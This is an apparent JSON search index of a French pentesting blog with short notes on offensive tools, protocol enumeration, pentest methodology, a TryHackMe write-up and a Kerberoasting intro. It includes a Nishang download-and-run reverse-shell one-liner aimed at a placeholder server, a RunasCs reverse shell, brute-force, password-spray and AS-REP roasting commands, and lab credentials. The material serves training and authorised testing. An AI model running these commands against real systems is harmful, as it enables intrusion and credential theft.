terminée, vous obtiendrez un ou plusieurs fichiers .json.gz à importer dans l’interface BloodHound.\nneo4j console http://localhost:7474/ Bloodhound\nhttps://bloodhound.readthedocs.io/en/latest/index.html https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/\n","permalink":"https://nyobemichel.me/posts/outils/bloodhound/","summary":"Bloodhound","title":"Bloodhound"},{"content":"est un couteau suisse d\u0026rsquo;escalade des privilèges Active Directory ./bloodyAD.py \u0026ndash;host \u0026ldquo;10.10.11.42\u0026rdquo; -d \u0026ldquo;Administrator.htb\u0026rdquo; -u \u0026ldquo;olivia\u0026rdquo; -p \u0026ldquo;ichliebedich\u0026rdquo; set password \u0026ldquo;michael\u0026rdquo; \u0026ldquo;Password@123\u0026rdquo; https://github.com/CravateRouge/bloodyAD\n","permalink":"https://nyobemichel.me/posts/outils/bloodyad/","summary":"BloodyAD","title":"BloodyAD"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/chisel/","summary":"chisel","title":"chisel"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/crackmapexec/","summary":"Crackmapexec","title":"Crackmapexec"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/curl/","summary":"Curl","title":"curl"},{"content":"Ce shell est le shell WinRM ultime pour le piratage/pentesting.\nWinRM (Windows Remote Management) est l\u0026rsquo;implémentation Microsoft du protocole WS-Management. Un protocole standard basé sur SOAP qui permet l\u0026rsquo;interopérabilité du matériel et des systèmes d\u0026rsquo;exploitation de différents fournisseurs. Microsoft l\u0026rsquo;a inclus dans ses systèmes d\u0026rsquo;exploitation afin de faciliter la vie des administrateurs système.\nCe programme peut être utilisé sur n\u0026rsquo;importe quel serveur Microsoft Windows avec cette fonctionnalité activée (généralement sur le port 5985), bien sûr uniquement si vous disposez des informations d\u0026rsquo;identification et des autorisations pour l\u0026rsquo;utiliser. Nous pouvons donc dire qu\u0026rsquo;il pourrait être utilisé dans une phase de piratage/pentesting post-exploitation. Le but de ce programme est de fournir des fonctionnalités agréables et faciles à utiliser pour le piratage. Il peut également être utilisé à des fins légitimes par les administrateurs système, mais la plupart de ses fonctionnalités sont axées sur le piratage/pentesting.\nIl est principalement basé sur la bibliothèque WinRM Ruby qui a changé sa façon de fonctionner depuis sa version 2.0. Désormais, au lieu d\u0026rsquo;utiliser le protocole WinRM, il utilise PSRP (Powershell Remoting Protocol) pour initialiser les pools d\u0026rsquo;espaces d\u0026rsquo;exécution ainsi que pour créer et traiter les pipelines.\nevil-winrm -i MonIP -u emily.oscars -p 'Passw'\nhttps://github.com/Hackplayers/evil-winrm\n","permalink":"https://nyobemichel.me/posts/outils/evil-winrm/","summary":"Evil-WinRM","title":"Evil-WinRM"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/ffuf/","summary":"ffuf","title":"ffuf"},{"content":"Peut être utilisé pour récupérer les utilisateurs du domaine qui ont défini « Ne pas exiger de pré-authentification Kerberos » et demander leurs TGT sans connaître leurs mots de passe. Il est alors possible de tenter de déchiffrer la clé de session envoyée avec le ticket pour récupérer le mot de passe de l\u0026rsquo;utilisateur.\nour vérifier si l\u0026rsquo;un de ces noms d\u0026rsquo;utilisateur est valide, nous utiliserons le script GetNPUsers.py.\n./GetNPUsers.py Domain_name/ -usersfile Usernames.txt -dc-ip 10.129.28.119 https://tools.thehacker.recipes/impacket/examples/getnpusers.py#commons\n","permalink":"https://nyobemichel.me/posts/outils/getnpusers.py/","summary":"GetNPUsers.py","title":"GetNPUsers.py"},{"content":"Gobuster est un outil polyvalent couramment utilisé pour le forçage de répertoires et de fichiers, mais il excelle également dans la découverte d\u0026rsquo;hôtes virtuels. Il envoie systématiquement des requêtes HTTP avec différents Hosten-têtes à une adresse IP cible, puis analyse les réponses pour identifier les hôtes virtuels valides.\nIl y a quelques éléments que vous devez préparer pour forcer Hostles en-têtes :\nTarget IdentificationTout d\u0026rsquo;abord, identifiez l\u0026rsquo;adresse IP du serveur web cible. Cela peut être réalisé par des recherches DNS ou d\u0026rsquo;autres techniques de reconnaissance. Wordlist PreparationPréparez une liste de mots contenant des noms d\u0026rsquo;hôtes virtuels potentiels. Vous pouvez utiliser une liste de mots précompilée, telle que SecLists, ou en créer une personnalisée en fonction du secteur d\u0026rsquo;activité de votre cible, des conventions de nommage ou d\u0026rsquo;autres informations pertinentes. gobuster dir -u http://10.10.11.72 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 gobuster vhost -u http://\u0026lt;target_IP_address\u0026gt; -w \u0026lt;wordlist_file\u0026gt; --append-domain ","permalink":"https://nyobemichel.me/posts/outils/gobuster/","summary":"Gobuster","title":"Gobuster"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/guacamole/","summary":"Guacamole","title":"Guacamole"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/hascat/","summary":"hascat","title":"hascat"},{"content":"hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v Pages de connexion HTTP\nhydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form \u0026#34;/login-get/index.php:username=^USER^\u0026amp;password=^PASS^:S=logout.php\u0026#34; -f SMTP\nhydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v https://github.com/digininja/CeWL ( generer une liste de mot passe )\n","permalink":"https://nyobemichel.me/posts/outils/hydra/","summary":"Hydra","title":"Hydra"},{"content":"Kerbrute est un outil d\u0026rsquo;énumération populaire utilisé pour forcer et énumérer les utilisateurs Active Directory valides en abusant de la pré-authentification Kerberos . https://github.com/ropnop/kerbrute/releases Rendre Kerbrute executable Enumeration des utilisateurs L\u0026rsquo;énumération des utilisateurs vous permet de savoir quels comptes d\u0026rsquo;utilisateurs se trouvent sur le domaine cible et quels comptes pourraient potentiellement être utilisés pour accéder au réseau.\n./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt ","permalink":"https://nyobemichel.me/posts/outils/kerbrute/","summary":"kerbrute","title":"kerbrute"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/linpeas/","summary":"linPeas","title":"linPeas"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/netexec/","summary":"NetExec","title":"NetExec"},{"content":"Nishang est un framework et un ensemble de scripts et de charges utiles permettant d\u0026rsquo;utiliser PowerShell pour la sécurité offensive, les tests d\u0026rsquo;intrusion et le red teaming. Nishang est utile à toutes les phases des tests d\u0026rsquo;intrusion.\npowershell iex (New-Object Net.WebClient).DownloadString(\u0026#39;http://\u0026lt;yourwebserver\u0026gt;/Invoke-PowerShellTcp.ps1\u0026#39;);Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] https://github.com/samratashok/nishang\n","permalink":"https://nyobemichel.me/posts/outils/nishang/","summary":"Nishang","title":"Nishang"},{"content":"nmap -sV -sC $IP -v -p- --min-rate 1000 -Pn -T4\nII existe au total 6 états différents pour un port scanné que nous pouvons obtenir : Open Closed Filtered unfiltered open | filtered Closed | filtered -Pn Désactive les requêtes ICMP Echo. \u0026lsquo; nmap 10.129.2.0/24 -F | grep \u0026quot;/tcp\u0026quot; | wc -l\u0026rsquo;\nLeurres Il existe des cas dans lesquels les administrateurs bloquent en principe des sous-réseaux spécifiques de différentes régions. Cela empêche tout accès au réseau cible. Un autre exemple est lorsque IPS doit nous bloquer. Pour cette raison, la méthode de balayage Decoy ( -D) est le bon choix. Avec cette méthode, Nmap génère diverses adresses IP aléatoires insérées dans l\u0026rsquo;en-tête IP pour masquer l\u0026rsquo;origine du paquet envoyé. Avec cette méthode, nous pouvons générer aléatoirement ( RND) un nombre spécifique (par exemple : 5) d\u0026rsquo;adresses IP séparées par deux points ( :). Notre véritable adresse IP est ensuite placée aléatoirement entre les adresses IP générées. Dans l\u0026rsquo;exemple suivant, notre véritable adresse IP est donc placée en deuxième position. Un autre point critique est que les leurres doivent être vivants. Sinon, le service sur la cible peut être inaccessible en raison des mécanismes de sécurité SYN-flooding.\nnmap $ip -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 -p 80 Analyse uniquement les ports spécifiés. -sS Exécute une analyse SYN sur les ports spécifiés. -Pn Désactive les requêtes ICMP Echo. -n Désactive la résolution DNS. --disable-arp-ping Désactive le ping ARP. --packet-trace Affiche tous les paquets envoyés et reçus. -D RND:5 Génère cinq adresses IP aléatoires qui indiquent l\u0026rsquo;IP source d\u0026rsquo;où provient la connexion. `nmap 10.129.96.164 -n -Pn -p 80 -O -S 10.10.15.130 -e tun0 -sV` Proxy DNS Par défaut, Nmapeffectue une résolution DNS inverse, sauf indication contraire, pour trouver des informations plus importantes sur notre cible. Ces requêtes DNS sont également transmises dans la plupart des cas, car le serveur Web donné est censé être trouvé et visité. Les requêtes DNS sont effectuées via le UDP port 53. Le TCP port 53était auparavant utilisé uniquement pour les \u0026quot; Zone transfers\u0026quot; entre les serveurs DNS ou le transfert de données supérieur à 512 octets. De plus en plus, cela change en raison des extensions IPv6 et DNSSEC. Ces changements entraînent de nombreuses requêtes DNS via le port TCP 53.\nCependant, cela Nmapnous donne toujours un moyen de spécifier nous-mêmes les serveurs DNS ( --dns-server \u0026lt;ns\u0026gt;,\u0026lt;ns\u0026gt;). Cette méthode pourrait nous être fondamentale si nous nous trouvons dans une zone démilitarisée ( DMZ). Les serveurs DNS de l\u0026rsquo;entreprise sont généralement plus fiables que ceux d\u0026rsquo;Internet. Ainsi, par exemple, nous pourrions les utiliser pour interagir avec les hôtes du réseau interne. Comme autre exemple, nous pouvons utiliser TCP port 53comme port source ( --source-port) pour nos analyses. Si l\u0026rsquo;administrateur utilise le pare-feu pour contrôler ce port et ne filtre pas correctement les IDS/IPS, nos paquets TCP seront approuvés et transmis.\nnmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 ncat -nv --source-port 53 10.129.150.182 50000 ","permalink":"https://nyobemichel.me/posts/outils/nmap/","summary":"Nmap","title":"Nmap"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/powerups/","summary":"PowerUps","title":"PowerUps"},{"content":"Get-DomainGPOLocalGroup Renvoie tous les objets de stratégie de groupe d\u0026rsquo;un domaine qui modifient les appartenances aux groupes locaux via les préférences « Groupes restreints » ou Stratégie de groupe. Renvoie également leurs mappages d\u0026rsquo;appartenance d\u0026rsquo;utilisateur, s\u0026rsquo;ils existent.\nGet-DomainObjectAcl Renvoie les ACL associées à un objet Active Directory spécifique. debut de l\u0026rsquo;attaque [[Abusing Active Directory ACLs]]\nGet-DomainObjectAcl -Identity \u0026#34;Domain Admins\u0026#34; -ResolveGUIDs - Verbose PowerView\nLe Domaine Courant Get-Netdomain Obtenir le SID du domain actuel Get-DomainSID Obtenir les COntrolleur de domaine Get-NetDomainController Obtenir la liste des utilisateurs du Domaine Get-NetUser Recherche les machines sur le domaine local où l\u0026rsquo;utilisateur actuel dispose d\u0026rsquo;un accès administrateur local. Find-LocalAdminAccess ","permalink":"https://nyobemichel.me/posts/outils/poweview/","summary":"Poweview","title":"Poweview"},{"content":"Il achemine tout le trafic provenant de n\u0026rsquo;importe quel outil de ligne de commande vers n\u0026rsquo;importe quel proxy que nous spécifions. il ajoute un proxy à n\u0026rsquo;importe quel outil de ligne de commande et constitue donc la méthode la plus simple pour acheminer le trafic Web des outils de ligne de commande via nos proxys Web. Pour utiliser proxychains, nous devons d\u0026rsquo;abord éditer /etc/proxychains.conf, commenter la dernière ligne et ajouter la ligne suivante à la fin de celle-ci :\n#socks4 127.0.0.1 9050 http 127.0.0.1 8080 Nous devrions également activer Quiet Mode pour la réduction du bruit en décommettant quiet_mode. Une fois cela fait, nous pouvons ajouter proxychains a n\u0026rsquo;importe quelle commande au début, et le trafic de cette commande sera acheminé via proxychains pour notre proxy web. Par exemple, essayons d\u0026rsquo;utiliser cURLl\u0026rsquo;un de nos exercices précédents :\nproxychains curl http://SERVER_IP:PORT ProxyChains-3.1 (http://proxychains.sf.net) \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Ping IP\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;./style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; ...SNIP... \u0026lt;/html\u0026gt; https://github.com/haad/proxychains\n","permalink":"https://nyobemichel.me/posts/outils/proxychains/","summary":"proxychains","title":"Proxychains"},{"content":"Psexec est depuis des années la méthode de référence pour exécuter des processus à distance. Il permet à un administrateur d\u0026rsquo;exécuter des commandes à distance sur n\u0026rsquo;importe quel PC auquel il a accès.\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/psexec\npsexec.py /:@[[username-anarchyPublic]]\n","permalink":"https://nyobemichel.me/posts/outils/psexec-v2.43/","summary":"PsExec v2.43","title":"PsExec v2.43"},{"content":"LLMNR/NBT-NS/mDNS Poisoner\n","permalink":"https://nyobemichel.me/posts/outils/responder/","summary":"Responder","title":"Responder"},{"content":"Rubeus est un outil puissant pour attaquer Kerberos. Adapté de l\u0026rsquo;outil Kekeo, Rubeus propose une grande variété d\u0026rsquo;attaques et de fonctionnalités qui en font un outil très polyvalent pour attaquer Kerberos. Parmi ses nombreux outils et attaques, on peut citer le dépassement de hachage, les demandes et renouvellements de tickets, la gestion et l\u0026rsquo;extraction de tickets, la collecte, la transmission de tickets, l\u0026rsquo;AS-REP Roasting et le Kerberoasting. https://github.com/GhostPack/Rubeus\nRécolte de Tickets Rubeus.exe harvest /interval:30 Cette commande indique a Rubeux de recolter des TGT toutes les 30 secondes\nForce Brute / Pulverisation de mot de passe Cette attaque utilise un mot de passe Kerberos donné, le diffuse sur tous les utilisateurs détectés et génère un ticket .kirbi. Ce ticket est un TGT permettant d\u0026rsquo;obtenir des tickets de service auprès du KDC, ainsi que dans des attaques telles que l\u0026rsquo;attaque par transfert de ticket.\nRubeus.exe brute /password:Password1 /noticket Cela prendra un mot de passe donné et le « vaporisera » sur tous les utilisateurs trouvés, puis donnera le TGT .kirbi pour cet utilisateur\n","permalink":"https://nyobemichel.me/posts/outils/rubeus/","summary":"Rubeus","title":"Rubeus"},{"content":"./RunasCs.exe \u0026lsquo;M.schoolbus\u0026rsquo; \u0026lsquo;\u0026rsquo; powershell.exe -r \u0026lt;nc_IP\u0026gt;:\u0026lt;nc_Port\u0026gt;\n","permalink":"https://nyobemichel.me/posts/outils/runascs/","summary":"Runascs","title":"Runascs"},{"content":"Utiliser le fichier avec sqlmap :\nsqlmap -r requete.txt --dump --batch ","permalink":"https://nyobemichel.me/posts/outils/sqlmap/","summary":"SQLMAp","title":"SQLMAp"},{"content":"sshuttle : là où le proxy transparent rencontre le VPN et SSH Autant que je sache, sshuttle est le seul programme qui résout le cas courant suivant :\nVotre machine cliente (ou routeur) est Linux, FreeBSD, MacOS ou Windows. Vous avez accès à un réseau distant via ssh. Vous n’avez pas nécessairement accès administrateur sur le réseau distant. Le réseau distant n\u0026rsquo;a pas de VPN, ou seulement des protocoles VPN complexes (IPsec, PPTP, etc.). Ou peut-être êtes- vous l\u0026rsquo;administrateur et êtes-vous simplement frustré par l\u0026rsquo;état lamentable des outils VPN ? Vous ne souhaitez pas créer une redirection de port SSH pour chaque hôte/port du réseau distant. Vous détestez la redirection de port d\u0026rsquo;OpenSH parce qu\u0026rsquo;elle est aléatoirement lente et/ou stupide. Vous ne pouvez pas utiliser la fonctionnalité PermitTunnel d\u0026rsquo;OpenSH car elle est désactivée par défaut sur les serveurs OpenSH ; de plus, elle utilise TCP-over-TCP, ce qui a des performances terribles . ","permalink":"https://nyobemichel.me/posts/outils/sshuttle/","summary":"sshuttle","title":"sshuttle"},{"content":"Outils permettant de générer des noms d\u0026rsquo;utilisateur lors de tests de pénétration. _Les noms d\u0026rsquo;utilisateur représentent la moitié du problème de force brute des mots de passe.\n./username-anarchy --input-file Names.txt --select-format first.last,firstl,f.last,flast \u0026gt; Usernames.txt https://github.com/urbanadventurer/username-anarchy\n","permalink":"https://nyobemichel.me/posts/outils/username-anarchypublic/","summary":"username-anarchyPublic","title":"username-anarchyPublic"},{"content":" The version of WordPress installed and any associated vulnerabilities What plugins are installed and any associated vulnerabilities What themes are installed and any associated vulnerabilities Username enumeration Users with weak passwords via password brute forcing Backed up and publicly accessible wp-config.php files Database dumps that may be publicly accessible If error logs are exposed by plugins Media file enumeration Vulnerable Timthumb files If the WordPress readme file is present If WP-Cron is enabled If user registration is enabled Full Path Disclose Upload directory listing https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation ","permalink":"https://nyobemichel.me/posts/outils/wpscan/","summary":"WPscan","title":"WPscan"},{"content":"Le protocole FTP File Transfer Protocol( FTP) est l\u0026rsquo;un des plus anciens protocoles d\u0026rsquo;Internet. Il s\u0026rsquo;exécute au sein de la couche application de la pile de protocoles TCP/IP. Port 21\nQuelques Commande FTP\nget , Connect , put , quit , status , verbose\nft $IP Telecharger tous les fichiers disponibles\nwget -m --no-passive ftp://anonymous:anonymous@10.129.14.13 Trouver tous les scripts ftp Nmap\nfind / -type f -name ftp* 2\u0026gt;/dev/null | grep scripts TFTP Trivial File Transfer Protocol( TFTP) est plus simple que FTP et effectue des transferts de fichiers entre les processus client et serveur.\nhttps://web.archive.org/web/20230326204635/https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---ftp/","summary":"FTP","title":"Enumeration - FTP"},{"content":"Network File System( NFS) est un système de fichiers réseau développé par Sun Microsystems et dont l\u0026rsquo;objectif est le même que SMB.\nsudo nmap --script nfs* $ip$ -sV -p111,2049 Afficher les partage NFS Disponible\nshowmount -e 10.129.14.128 Montage du partage NFS\nmkdir target-NFS sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock cd target-NFS tree . ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---nfs/","summary":"NFS","title":"Enumeration - NFS"},{"content":"Definition Server Message Block ( SMB ) est un protocole de communication utilisé pour partager des fichiers, des imprimantes , des ports série et diverses communications entre les nœuds d\u0026rsquo;un réseau. port SMB 139 445\ntools smbclient\nL : list des partages sur la machines -U : user smbmap H : user crackmapexec smb 192.168.1.17 -u \u0026lsquo;raj\u0026rsquo; -p \u0026lsquo;123\u0026rsquo; \u0026ndash;shares \u0026ndash;users\nsudo nmap $ip$ -sV -sC -p139,445 rpcclient -U \u0026#34; \u0026#34; $ip Le rpcclientclient rpc propose de nombreuses requêtes permettant d\u0026rsquo;exécuter des fonctions spécifiques sur le serveur SMB pour obtenir des informations srvinfo , enumdomains, querydominfo, netshareenumall , netsharegetinfo , enumdomusers , queryuser Impacket - Samrrdump.py\nsmbmap -H $ip https://fr.wikipedia.org/wiki/Server_Message_Block\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---smb/","summary":"SMB","title":"Enumeration - SMB"},{"content":"Le protocole Simple Mail Transfer Protocol( SMTP) permet d\u0026rsquo;envoyer des e-mails sur un réseau IP. Il peut être utilisé entre un client de messagerie et un serveur de courrier sortant, ou entre deux serveurs SMTP Par défaut, les serveurs SMTP acceptent les demandes de connexion sur le port 25 Pour interagir avec le serveur SMTP, nous pouvons utiliser l\u0026rsquo; telnetoutil pour initialiser une connexion TCP. L\u0026rsquo;initialisation de la session s\u0026rsquo;effectue avec la commande mentionnée ci-dessus, HELOou EHLO.\\\ntelnet IP_ADRESS 25 sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v smtp-user-enum smtp-user-enum -M VRFY -U /usr/share/seclists/Discovery/SNMP/snmp.txt -t 10.129.1.62 https://serversmtp.com/smtp-error/\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---smtp/","summary":"SMTP","title":"Enumeration - SMTP"},{"content":"Outils\nCrackmapexec netexec smbclient rpcclient ldapsearch ldapsearch -x -H ldap://10.10.11.75 -D \u0026#39;name\u0026#39; -w \u0026#39;password\u0026#39; -b \u0026#34;dc=rustykey,dc=htb\u0026#34; \u0026#34;(objectClass=user)\u0026#34; userPrincipalName ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration-ad---externe/","summary":"SMTP","title":"Enumeration - SMTP"},{"content":"1. Phase de pré-engagement La phase de pré-engagement est cruciale car elle pose les bases de l\u0026rsquo;ensemble du test de pénétration. Au cours de cette phase, les testeurs de pénétration travaillent en étroite collaboration avec le client pour comprendre ses besoins, ses préoccupations et ses objectifs spécifiques. Cela comprend la définition de la portée du test, l\u0026rsquo;établissement des échéanciers et la détermination des systèmes et des réseaux qui seront testés.\n2. Phase de collecte d\u0026rsquo;informations La collecte d\u0026rsquo;informations, également appelée reconnaissance ou collecte de renseignements, consiste à recueillir autant d\u0026rsquo;informations pertinentes que possible sur la cible. Cette phase peut être divisée en reconnaissance passive et active.\nPassive reconnaissanceimplique la collecte d\u0026rsquo;informations sans interaction directe avec les systèmes cibles. Cela peut inclure l\u0026rsquo;analyse de documents publics, la recherche sur les réseaux sociaux, l\u0026rsquo;examen des sites Web d\u0026rsquo;entreprises et l\u0026rsquo;utilisation d\u0026rsquo;outils OSINT (Open Source Intelligence). Cette approche ne laisse aucune trace et ne présente aucun risque pour l\u0026rsquo;infrastructure cible.\nActive reconnaissance, d\u0026rsquo;autre part, implique une interaction directe avec les systèmes cibles. Cela inclut des activités telles que l\u0026rsquo;analyse des ports, l\u0026rsquo;énumération des services et la capture de bannières. Bien que plus intrusive, cette méthode fournit des informations techniques détaillées sur l\u0026rsquo;environnement cible.\n3. Phase d’évaluation de la vulnérabilité Au cours de la phase d\u0026rsquo;évaluation des vulnérabilités, les testeurs de pénétration analyse les informations se sont réunis pour identifier les faiblesses potentielles en matière de sécurité. Cela implique l\u0026rsquo;utilisation de divers outils d\u0026rsquo;analyse automatisés et de techniques de test manuel pour découvrir les vulnérabilités des systèmes, des applications et de l\u0026rsquo;infrastructure réseau.\n4. Phase d\u0026rsquo;exploitation La phase d\u0026rsquo;exploitation est celle où les testeurs de pénétration tentent d\u0026rsquo;exploiter les vulnérabilités identifiées lors de la phase précédente. Cela permet de démontrer l\u0026rsquo;impact réel des faiblesses de sécurité et d\u0026rsquo;établir ce qu\u0026rsquo;un attaquant réel pourrait être en mesure d\u0026rsquo;accomplir.\nLors de l\u0026rsquo;exploitation, les testeurs doivent documenter soigneusement leurs activités et conserver un enregistrement précis des systèmes auxquels ils ont accédé. Il est essentiel de respecter les règles d\u0026rsquo;engagement convenues et d\u0026rsquo;éviter de causer des dommages aux systèmes de production. Les testeurs qualifiés créent souvent des chaînes d\u0026rsquo;attaque détaillées, montrant comment plusieurs vulnérabilités peuvent être combinées pour obtenir un accès plus approfondi.\n5. Phase post-exploitation Une fois l\u0026rsquo;accès initial obtenu, la phase de post-exploitation commence. Cette phase comprend des activités telles que l\u0026rsquo;escalade des privilèges, le mouvement latéral à travers le réseau, les tests d\u0026rsquo;exfiltration de données et le maintien de la persistance. L\u0026rsquo;objectif est de comprendre l\u0026rsquo;étendue complète de ce qu\u0026rsquo;un attaquant pourrait accomplir après avoir franchi les défenses initiales.\n6. Phase de mouvement latéral Le mouvement latéral consiste à naviguer dans le réseau après avoir obtenu un accès initial pour découvrir des systèmes, des ressources et des cibles potentielles supplémentaires. Cette phase se concentre sur l\u0026rsquo;identification et l\u0026rsquo;exploitation des relations de confiance entre les systèmes et sur l\u0026rsquo;élargissement de la présence du testeur de pénétration au sein du réseau.\n7. Preuve de concept La phase de preuve de concept consiste à créer un document detaille des preuves des preuves démontrant comment les vulnérabilités ont été exploitées. Cela comprend le développement de méthodes fiables et reproductibles pour reproduire les problèmes de sécurité identifiés, ce qui permet de valider les résultats et d\u0026rsquo;aider l\u0026rsquo;équipe technique du client à comprendre et à corriger les vulnérabilités.\n8. Phase post-engagement La phase de reporting est essentielle car elle permet de compiler les résultats techniques actionable information for the client. Un rapport de test de pénétration bien rédigé comprend généralement un résumé destiné à la direction, des résultats techniques détaillés destinés à l\u0026rsquo;équipe informatique et des recommandations claires pour la correction.\n9. Assistance à la remédiation et nouveaux tests Après la remise du rapport, de nombreuses missions de tests d\u0026rsquo;intrusion incluent une période de support de correction. Pendant cette période, les testeurs se rendent disponibles pour répondre aux questions sur leurs conclusions et fournir des conseils supplémentaires sur la mise en œuvre des correctifs.\n","permalink":"https://nyobemichel.me/posts/structure-test-penetration/","summary":"Un aperçu des phases lors d\u0026rsquo;un test d’intrusion","title":"structure test penetration"},{"content":"Avant de se lancer dans un test de pénétration, plusieurs crucial prerequisiteséléments doivent être établis pour garantir un engagement réussi, légal et professionnel. Ces éléments fondamentaux protègent à la fois le testeur de pénétration et le client tout en maximisant la valeur de l\u0026rsquo;évaluation. Ces éléments peuvent être, sans s\u0026rsquo;y limiter :\nAutorisation légale et documentation Définition et limites du champ d\u0026rsquo;application Collecte d\u0026rsquo;informations Canaux de communication et procédures d\u0026rsquo;urgence Préparation de l\u0026rsquo;environnement de test Considérations relatives à la sauvegarde et à la récupération Documentation et rapports Responsabilité professionnelle et assurance Confidentialité et traitement des données Autorisation légale et documentation La pierre angulaire de toute mission de test de pénétration est une autorisation légale appropriée. Cela commence par un accord écrit formel, souvent appelé Statement of Work( SoW) ou Master Services Agreement( MSA). Un MSA est souvent utilisé lorsqu\u0026rsquo;il existe une relation continue entre le client et le prestataire de services de test de pénétration. Il décrit les conditions générales de la relation commerciale\nMéthodologies de test de pénétration de base Penetration Testing Execution Standard La méthodologie la plus largement reconnue dans le domaine des tests de pénétration est la Penetration Testing Execution Standard . La PTES fournit un cadre qui divise le processus de test de pénétration en sept phases distinctes : interactions avant engagement, collecte de renseignements, modélisation des menaces, analyse des vulnérabilités, exploitation, post-exploitation et reporting. http://www.pentest-standard.org/index.php/Main_Page\nLe Technical Guide to Information Security Testing and Assessment représente une approche plus formelle. Bien qu'il ne s'agisse pas strictement d'une méthodologie de test de pénétration, il fournit des conseils précieux sur la planification, l'exécution et les activités post-test de l'évaluation de la sécurité. Ce cadre est particulièrement pertinent lorsque l'on travaille avec des agences ou des organisations gouvernementales qui suivent les directives du NIST. https://www.nist.gov/privacy-framework/nist-sp-800-115\nOpen Web Application Security Project L’OWASP WSTG se concentre sur les tests de sécurité applicative web, avec des cas de test détaillés pour chaque vecteur d’attaque connu.\nhttps://owasp.org/www-project-web-security-testing-guide/stable/\nLe cadre MITRE ATT\u0026amp;CK https://attack.mitre.org/\n","permalink":"https://nyobemichel.me/posts/pr%C3%A9requis-pour-un-test-de-p%C3%A9n%C3%A9tration/","summary":"Une vue d\u0026rsquo;ensemble structurée des prérequis et méthodologies à maîtriser avant de réaliser un test d’intrusion.","title":"Prérequis pour un test de pénétration part1"},{"content":"Enumeration Nmap Nous commençons par exécuter une analyse nmap sur la cible :\nLe scan nous montre que le port 22 et 80 sont ouverts.\nWebserver Je tombe sur un site web anodin :\nAprès énumération des répertoires, je découvre /spip :\nRéférence Metasploit utilisée :\nhttps://github.com/rapid7/metasploit-framework/pull/17711/files\nAprès plusieurs heures, j’ai essayé le framework Metasploit :\nPATH Injection AppArmor est un outil qui permet de restreindre un programme avec des règles. Vous pouvez accéder à ces informations par une simple recherche sur Google.\nJ’ai eu cette indication dans la salle, je suis donc allé examiner les fichiers AppArmor pour mieux comprendre les règles :\nJ\u0026rsquo;ajoute le dossier /var/tmp, sur lequel j’ai les droits d’écriture.\nJe crée ensuite un fichier binaire appelé docker et l\u0026rsquo;autorise à s\u0026rsquo;exécuter. Ce fichier contient /bin/bash -p. Je souhaite donc utiliser la commande bash en mode privilégié.\nSi vous faites attention, lorsque j’imprime la valeur $PATH, le shell initial est ash, mais après l’opération, il devient bash.\nEnsuite, je copie mon fichier docker dans /opt/run_container.sh et j\u0026rsquo;exécute le binaire /usr/sbin/run_container avec le bit SUID… et je suis ROOT !!!\n","permalink":"https://nyobemichel.me/posts/publisher-thm/","summary":"tryhackme","title":"Publisher - THM"},{"content":"Introduction Kerberoasting est une technique d’attaque post-exploitation qui cible les environnements Active Directory, plus précisément les comptes de service protégés par le protocole d’authentification Kerberos.\nL’objectif de l’attaquant est de récupérer des tickets de service (TGS) chiffrés, puis de craquer hors ligne les hashs de mots de passe des comptes de service associés à des Service Principal Names (SPN). Une fois le mot de passe récupéré, cela peut mener à une élévation de privilèges ou à une lateralisation dans le réseau.\n⚙️ Fonctionnement du protocole Kerberos (rappel rapide) Lorsqu’un utilisateur demande l’accès à un service, il envoie un TGT (Ticket Granting Ticket) valide et le nom du service (via le sname) au KDC (Key Distribution Center). Si le ticket est valide, le KDC renvoie un TGS, chiffré avec le hash du mot de passe du compte de service ciblé.\nC’est cette étape que l’attaquant va détourner pour capturer ce TGS et tenter de retrouver le mot de passe par brute force ou dictionnaire.\n🧠 Étapes de l’attaque Kerberoasting Voici le workflow typique d’une attaque Kerberoasting :\n1. Accès initial L’attaquant compromet un compte d’utilisateur standard dans le domaine Active Directory.\n2. Reconnaissance Il utilise des outils pour énumérer les SPN présents dans le domaine (comptes de service).\n3. Requête TGS Il envoie des requêtes au contrôleur de domaine pour obtenir les tickets TGS associés à ces SPN.\n4. Extraction de tickets Il extrait les TGS localement (le système les stocke en mémoire), à l’aide d’outils comme Rubeus ou Mimikatz.\n5. Crackage hors ligne Le ticket est cracké hors ligne avec Hashcat ou John the Ripper afin de révéler le mot de passe du compte de service.\n🔧 Outils utiles Voici une liste d’outils populaires pour mener une attaque Kerberoasting :\nRubeus (C#) Mimikatz Impacket - GetUserSPNs.py PowerView (PowerShell) Empire / Invoke-Kerberoast.ps1 Hashcat ou John pour le crackage hors ligne 💥 Exécution de l’attaque - Cas pratiques 🎯 Kerberoasting avec Rubeus Rubeus.exe kerberoast 💣 Cracker le hash avec 